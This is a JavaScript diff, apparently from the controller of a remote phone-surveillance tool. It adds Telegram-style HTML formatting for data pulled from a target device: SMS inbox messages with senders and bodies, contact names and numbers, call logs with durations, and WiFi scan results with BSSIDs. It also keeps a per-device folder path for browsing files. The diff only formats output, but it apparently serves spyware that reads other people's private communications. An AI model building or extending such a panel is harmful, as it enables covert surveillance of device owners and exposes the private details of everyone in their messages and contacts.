@@ -118,28 +118,73 @@ const escapeHTML = (str) => {
 
 const formatDeviceResponse = (data) => {
     if (data === null || data === undefined) return '\n└ [Kosong]';
-    if (typeof data === 'string') return `\n└ ${escapeHTML(data)}`;
+    if (typeof data === 'string') return `\n└ <code>${escapeHTML(data)}</code>`;
+
+    // 📩 Khusus SMS Inbox / SMS List
+    if (['sms_inbox', 'sms_list'].includes(data.type) && Array.isArray(data.data)) {
+        return '\n' + data.data.map((sms, i) => {
+            const sender = sms.from || sms.address || 'Unknown';
+            const body = sms.body || sms.message || '';
+            return `${i + 1}. 📩 <b>${escapeHTML(sender)}</b>\n   └ ${escapeHTML(body)}`;
+        }).join('\n\n');
+    }
+
+    // 👤 Khusus Contact List
+    if (['contact_list', 'contacts'].includes(data.type) && Array.isArray(data.data)) {
+        return '\n' + data.data.map((c, i) => {
+            return `${i + 1}. 👤 <b>${escapeHTML(c.name || 'Unknown')}</b>\n   └ 📞 <code>${escapeHTML(c.number || c.phone || '-')}</code>`;
+        }).join('\n\n');
+    }
+
+    // 📞 Khusus Call Logs
+    if (['call_logs', 'calls'].includes(data.type) && Array.isArray(data.data)) {
+        return '\n' + data.data.map((c, i) => {
+            let icon = '📞';
+            if (['INCOMING', '1'].includes(String(c.type))) icon = '📥';
+            else if (['OUTGOING', '2'].includes(String(c.type))) icon = '📤';
+            else if (['MISSED', '3'].includes(String(c.type))) icon = '❌';
+            return `${i + 1}. ${icon} <b>${escapeHTML(c.name || c.number || 'Unknown')}</b>\n   └ <code>${escapeHTML(c.number)}</code> | ⏳ <code>${c.duration || '0s'}</code>`;
+        }).join('\n\n');
+    }
+
+    // 📶 Khusus WiFi Scan (Mirip Web UI)
+    if (data.type === 'wifi_networks' && Array.isArray(data.data)) {
+        const sorted = [...data.data].sort((a, b) => (b.level || b.signal || 0) - (a.level || a.signal || 0));
+        return '\n' + sorted.map((wifi, idx) => {
+            const ss = (wifi.level || wifi.signal || 0);
+            let icon = '📶🔴';
+            if (ss >= -50) icon = '📶🔵';
+            else if (ss >= -65) icon = '📶🟢';
+            else if (ss >= -80) icon = '📶🟡';
+
+            const ssid = wifi.ssid || wifi.SSID || '[Hidden SSID]';
+            const bssid = wifi.bssid || wifi.BSSID || '-';
+            const freq = (wifi.frequency || wifi.freq || '') ? ` | ${wifi.frequency || wifi.freq} MHz` : '';
+
+            return `${idx + 1}. ${icon} <b>${escapeHTML(ssid)}</b>\n   └ <code>${ss} dBm</code> | 📍 <code>${escapeHTML(bssid)}</code>${freq}`;
+        }).join('\n\n');
+    }
 
     if (Array.isArray(data)) {
         if (data.length === 0) return '\n└ [Data Kosong]';
         return '\n' + data.map((item, idx) => {
-            const prefix = `  ${idx + 1}. `;
+            const prefix = `${idx + 1}. `;
             if (typeof item === 'object' && item !== null) {
                 return prefix + Object.entries(item)
-                    .map(([k, v]) => `${escapeHTML(k)}: ${escapeHTML(v)}`)
+                    .map(([k, v]) => `<b>${escapeHTML(k)}</b>: <code>${escapeHTML(v)}</code>`)
                     .join(' | ');
             }
-            return prefix + escapeHTML(item);
+            return prefix + `<code>${escapeHTML(item)}</code>`;
         }).join('\n');
     }
 
     if (typeof data === 'object') {
         return '\n' + Object.entries(data)
-            .map(([k, v]) => `  • <b>${escapeHTML(k)}</b>: ${escapeHTML(v)}`)
+            .map(([k, v]) => `  • <b>${escapeHTML(k)}</b>: <code>${escapeHTML(v)}</code>`)
             .join('\n');
     }
 
-    return `\n└ ${escapeHTML(data)}`;
+    return `\n└ <code>${escapeHTML(data)}</code>`;
 };
 
 // State Memori Sederhana untuk Path (devId -> currentPath) untuk keperluan folder UP
